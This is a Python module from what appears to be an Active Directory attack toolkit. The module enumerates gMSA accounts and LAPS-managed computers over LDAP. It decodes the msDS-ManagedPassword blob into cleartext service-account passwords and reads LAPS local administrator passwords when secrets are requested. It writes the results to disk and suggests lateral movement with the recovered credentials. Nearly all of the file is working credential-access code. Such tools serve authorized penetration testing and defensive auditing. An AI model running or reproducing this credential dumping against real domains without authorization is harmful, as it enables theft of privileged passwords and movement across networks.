"""gMSA inventory, LAPS presence, and optional secret read (--include-secrets)."""

from __future__ import annotations

import json
import logging
import struct
from typing import Any

from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect, schema_supported_attributes
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()
_logger = logging.getLogger(__name__)

GMSA_FILTER = "(objectClass=msDS-GroupManagedServiceAccount)"
GMSA_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "objectSid",
    "msDS-ManagedPasswordInterval",
    "msDS-GroupMSAMembership",
    "msDS-ManagedPassword",
    "servicePrincipalName",
    "userAccountControl",
]

LAPS_CORE_ATTRS = ["sAMAccountName", "distinguishedName"]
LAPS_SCHEMA_ATTRS = [
    "ms-Mcs-AdmPwd",
    "ms-Mcs-AdmPwdExpirationTime",
    "msLAPS-Password",
    "msLAPS-PasswordExpirationTime",
    "msLAPS-EncryptedPassword",
]
LAPS_PASSWORD_ATTRS = ["ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-EncryptedPassword"]
LAPS_ATTRS = [*LAPS_CORE_ATTRS, *LAPS_SCHEMA_ATTRS]


def _entry_attr(entry: Any, name: str | None) -> Any | None:
    if not name:
        return None
    try:
        return entry[name]
    except (AttributeError, KeyError, TypeError):
        return getattr(entry, name, None)


def _parse_managed_password_blob(blob: bytes) -> dict[str, Any] | None:
    """Parse msDS-ManagedPassword BLOB (MS-ADTS MSDS-MANAGEDPASSWORD_BLOB)."""
    if not blob or len(blob) < 16:
        return None
    try:
        version, _reserved, length = struct.unpack_from("<HHI", blob, 0)
        cur_off, prev_off, _query_off, _unchanged_off = struct.unpack_from("<HHHH", blob, 8)
        out: dict[str, Any] = {"version": version, "length": length}

        def _wcs(offset: int) -> str | None:
            if offset == 0 or offset >= len(blob):
                return None
            end = offset
            while end + 1 < len(blob) and not (blob[end] == 0 and blob[end + 1] == 0):
                end += 2
            return blob[offset:end].decode("utf-16-le", errors="replace")

        cur = _wcs(cur_off)
        prev = _wcs(prev_off)
        if cur is not None:
            out["current_password"] = cur
        if prev is not None:
            out["previous_password"] = prev
        return out
    except Exception:
        return None


@register_capability(
    id="gmsa-laps-enum",
    summary="Enumerate gMSAs and LAPS; read secrets with --include-secrets when permitted",
    category="credential-access",
    tags=("gmsa", "laps", "credentials", "readgmsapassword"),
)
class GmsaLapsEnum:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        console.print(
            f"[bold]gMSA / LAPS[/bold] → {target.domain} @ {target.dc_ip}  "
            f"secrets={'ON' if include_secrets else 'off'}"
        )
        conn, base_dn, _cfg = ldap_connect(target)

        gmsas: list[dict[str, Any]] = []
        secrets_found = 0
        next_actions_hints: list[dict[str, str]] = []

        conn.search(base_dn, GMSA_FILTER, search_scope=SUBTREE, attributes=GMSA_ATTRS)
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            if not sam:
                continue
            dn = str(entry.distinguishedName)
            item: dict[str, Any] = {
                "sam": sam,
                "dn": dn,
                "interval": int(entry["msDS-ManagedPasswordInterval"].value)
                if entry["msDS-ManagedPasswordInterval"]
                else None,
            }
            membership = (
                entry["msDS-GroupMSAMembership"] if entry["msDS-GroupMSAMembership"] else None
            )
            if membership:
                # Security descriptor blob — surface a truncated signal for operators
                item["group_msa_membership_raw"] = str(membership.value)[:200]
                item["group_msa_membership_present"] = True
            else:
                item["group_msa_membership_present"] = False

            readable_by: list[dict[str, str]] = []
            sd = fetch_sd(conn, dn)
            if sd:
                try:
                    for ace in parse_interesting_aces(sd):
                        if ace.right in (
                            "GenericAll",
                            "ReadProperty",
                            "GenericWrite",
                            "AllExtendedRights",
                        ):
                            readable_by.append({"sid": ace.principal_sid, "right": ace.right})
                except Exception:
                    _logger.debug("Could not parse gMSA ACL", exc_info=True)
            item["acl_read_signals"] = [f"{row['sid']}:{row['right']}" for row in readable_by[:20]]

            mp = entry["msDS-ManagedPassword"] if entry["msDS-ManagedPassword"] else None
            if mp and mp.value is not None:
                item["managed_password_present"] = True
                if include_secrets:
                    raw = mp.value
                    if isinstance(raw, str):
                        raw = raw.encode("latin-1", errors="replace")
                    if isinstance(raw, bytes | bytearray):
                        parsed = _parse_managed_password_blob(bytes(raw))
                        if parsed and parsed.get("current_password"):
                            item["managed_password"] = parsed
                            secrets_found += 1
                            console.print(f"  [red]gMSA SECRET[/red]  {sam}")
                            next_actions_hints.append(
                                {
                                    "capability": "ticket-lifecycle",
                                    "reason": f"gMSA password recovered for {sam}",
                                }
                            )
                            next_actions_hints.append(
                                {
                                    "capability": "impacket-exec",
                                    "reason": f"Use recovered gMSA {sam} for lateral movement",
                                }
                            )
                        else:
                            item["managed_password_blob_len"] = len(raw)
                            item["managed_password_parse"] = "failed"
            else:
                item["managed_password_present"] = False

            node_id = f"GMSA@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(node_id, "User", sam=sam, dn=dn, gmsa=True)
            if item.get("managed_password_present"):
                graph.add_edge(node_id, node_id, "GMSAPasswordReadable")
            if include_secrets:
                for signal in readable_by:
                    src = f"SID@{signal['sid']}"
                    graph.add_node(src, "Base", sid=signal["sid"])
                    graph.add_edge(src, node_id, "ReadGMSAPassword", right=signal["right"])

            gmsas.append(item)
            console.print(
                f"  gMSA [cyan]{sam}[/cyan]  secret_attr={item['managed_password_present']}  "
                f"acl_signals={len(readable_by)}"
            )

        # LAPS
        laps_computers: list[dict[str, Any]] = []
        supported_laps, skipped_laps = schema_supported_attributes(conn, LAPS_SCHEMA_ATTRS)
        laps_by_name = {name.casefold(): name for name in supported_laps}
        password_attrs = [
            laps_by_name[name.casefold()]
            for name in LAPS_PASSWORD_ATTRS
            if name.casefold() in laps_by_name
        ]
        if password_attrs:
            presence_filter = "".join(f"({name}=*)" for name in password_attrs)
            conn.search(
                base_dn,
                f"(&(objectCategory=computer)(|{presence_filter}))",
                search_scope=SUBTREE,
                attributes=[*LAPS_CORE_ATTRS, *supported_laps],
            )
            laps_entries = list(conn.entries)
        else:
            laps_entries = []

        legacy_name = laps_by_name.get("ms-mcs-admpwd")
        windows_name = laps_by_name.get("mslaps-password")
        encrypted_name = laps_by_name.get("mslaps-encryptedpassword")
        for entry in laps_entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            if not sam:
                continue
            dn = str(entry.distinguishedName)
            legacy_attr = _entry_attr(entry, legacy_name)
            windows_attr = _entry_attr(entry, windows_name)
            encrypted_attr = _entry_attr(entry, encrypted_name)
            legacy = bool(legacy_attr)
            win_laps = bool(windows_attr or encrypted_attr)
            item = {
                "sam": sam,
                "dn": dn,
                "legacy_laps": legacy,
                "windows_laps": win_laps,
            }

            if include_secrets:
                if legacy_attr and legacy_attr.value:
                    item["ms_mcs_admpwd"] = str(legacy_attr.value)
                    secrets_found += 1
                    console.print(f"  [red]LAPS SECRET[/red]  {sam} (legacy)")
                if windows_attr and windows_attr.value:
                    item["mslaps_password"] = str(windows_attr.value)
                    secrets_found += 1
                    console.print(f"  [red]LAPS SECRET[/red]  {sam} (windows)")
                if encrypted_attr and encrypted_attr.value:
                    val = encrypted_attr.value
                    item["mslaps_encrypted_present"] = True
                    item["mslaps_encrypted_len"] = len(val) if hasattr(val, "__len__") else None

            readable_by = []
            sd = fetch_sd(conn, dn)
            if sd:
                try:
                    for ace in parse_interesting_aces(sd):
                        if ace.right in ("GenericAll", "ReadProperty"):
                            readable_by.append({"sid": ace.principal_sid, "right": ace.right})
                except Exception:
                    _logger.debug("Could not parse LAPS ACL", exc_info=True)
            item["acl_read_signals"] = [f"{row['sid']}:{row['right']}" for row in readable_by[:20]]

            node_id = f"COMPUTER@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(
                node_id,
                "Computer",
                sam=sam,
                dn=dn,
                laps=True,
                legacy_laps=legacy,
                windows_laps=win_laps,
            )
            if legacy or win_laps:
                graph.add_edge(node_id, node_id, "LAPSReadable")
            if include_secrets:
                for signal in readable_by:
                    src = f"SID@{signal['sid']}"
                    graph.add_node(src, "Base", sid=signal["sid"])
                    graph.add_edge(src, node_id, "ReadLAPSPassword", right=signal["right"])

            laps_computers.append(item)
            console.print(
                f"  LAPS [cyan]{sam}[/cyan]  legacy={legacy} windows={win_laps} "
                f"acl_signals={len(readable_by)}"
            )

        conn.unbind()

        result = {
            "domain": target.domain,
            "gmsa_count": len(gmsas),
            "gmsas": gmsas,
            "laps_computer_count": len(laps_computers),
            "laps_computers": laps_computers,
            "laps_schema": {
                "queried_attributes": supported_laps,
                "skipped_attributes": skipped_laps,
            },
            "secrets_returned": secrets_found if include_secrets else 0,
            "include_secrets": include_secrets,
            "suggested_next": next_actions_hints[:10],
        }

        out_path = session.path("gmsa-laps-enum.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "gmsa-laps-enum.complete",
            gmsa=len(gmsas),
            laps=len(laps_computers),
            secrets=result["secrets_returned"],
        )
        console.print(
            f"[green]Done[/green]  gMSA={len(gmsas)}  LAPS={len(laps_computers)}  "
            f"secrets={result['secrets_returned']}"
        )
        if not include_secrets:
            console.print(
                "[dim]Secrets not requested. Re-run with --include-secrets to dump "
                "readable gMSA/LAPS material.[/dim]"
            )
        console.print(f"Results → {out_path}")
        return result
